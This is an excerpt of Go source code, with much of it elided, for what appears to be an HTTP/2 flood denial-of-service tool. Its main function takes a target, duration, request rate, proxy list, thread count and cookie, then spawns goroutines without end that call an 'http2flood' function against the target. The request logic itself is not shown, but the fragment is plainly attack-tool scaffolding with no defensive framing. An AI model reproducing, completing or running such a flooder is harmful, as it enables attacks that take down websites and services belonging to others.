...
func http2flood(target string, rps int, limit chan struct{}, cooc string) {
	defer func() {
		<-limit
	}()
restart:
...
func main() {
	...
	if len(os.Args) < 7 {
		fmt.Println(fmt.Sprintf("%s target, duration, rps, proxylist, threads, cookie", os.Args[0]))
		return
	}
	var target string
	var duration int
	...
	for {
		...
		currentThreads++
		go func() {
			http2flood(target, rps, limit, os.Args[6])
			currentThreads--
		}()
